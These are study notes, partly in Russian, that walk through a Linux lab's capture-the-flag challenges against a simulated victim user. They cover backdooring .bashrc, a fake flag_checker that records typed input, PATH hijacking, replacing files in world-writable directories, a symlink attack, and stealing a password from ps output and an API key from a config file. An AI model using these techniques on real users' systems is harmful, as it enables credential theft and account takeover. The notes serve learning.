module Silly Shenanigans (уязвимости Linux)


Bashrc Backdoor:
When your shell starts up, it looks for `.bashrc` file (also applies to all users /etc/bash.bashrc)
```
In this challenge, we'll pretend that you've broken into a victim user's machine! That user is named `zardus`, with a home directory of `/home/zardus`. You, as the `hacker` user, have write access to his `.bashrc`, and `zardus` has read-access to `/flag`. The victim is simulated by the script `/challenge/victim`, and you can launch this script at any time to observe the victim logging into the computer. Can you get the flag?
```

есть доступ к записи в /home/zardus/.bashrc -> zardus владелец файла /flag -> echo "/bin/cat /flag > /home/hacker/file" > /home/zardus/.bashrc -> /challange/victim


Sniffing Input:
```
This time, Zardus doesn't keep the flag lying around in a readable file after he logs in. Instead he'll run a command named `flag_checker`, manually typing the flag into it for verification.
```

можно подменить flag_checker на:
```bash
#!/bin/bash
echo -n "Type the flag, victim: "
read -r var
echo "$var" > /home/hacker/file
```
и экспортировать в оболочку зардуса (PATH HIJACKING)
echo "export PATH=/home/hacker:$PATH" > /home/zardus/.bashrc -> /challange/victim


Overshared Directories:
The problem is that a subtlety of Linux file/directory permissions is that anyone with write access to a directory can _move_ and _delete_ files in it
```
In this challenge, for convenience, Zardus opened up his home directory.
```

`drwxrwxrwx 2 zardus zardus 4096 Oct 22 15:48 .` -> rm /home/zardus/.bashrc -> tocuh /home/zardus/.bashrc -> -`rw-r--r-- 1 hacker hacker    0 Oct 22 15:55 .bashrc` -> chmod a=rwx /home/zardus/.bashrc -> действия аналогичны для прошлого уровня


Tricky Linking:
```
In this challenge, when you run `/challenge/victim`, Zardus will add `cat /flag` to that list of commands:

hacker@dojo:~$ /challenge/victim
Username: zardus
Password: **********
zardus@dojo:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@dojo:~$ exit
logout
```

можно закинуть cat /flag в .bshrc
тк /tmp/collab world-writable можно: rm  /tmp/collab/evil-commands.txt -> ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt -> /challenge/victimv -> ещё раз

Sniffing Process Arguments:
```
Zardus is using an automation script, passing his account password to it as an argument. Zardus is also allowed to use `sudo`. Steal the password, log in to Zardus' account and get that flag!
```

ps aux -> 
```
root    su -c auto.sh --user zardus --pass pw_184821823 zardus
zardus    /bin/bash /run/challenge/bin/auto.sh --user zardus --pass pw_184821823
```
-> su zardus -> sudo cat /flag


Snooping on Configurations:
many files in a typical user's home directory are _world-readable by default_, despite frequently being used to store sensitive information.
```
Naturally, Zardus stores his key in `.bashrc`. Can you steal the key and get the flag?
---
**NOTE:** When you get the API key, just execute `flag_getter` as the `hacker` user. This challenge's `/challenge/victim` is just for theming: you don't need to use it.
```

cat /home/zardus/.bashrc -> FLAG_GETTER_API_KEY=sk-1174522205 -> flag_getter sk-1174522205
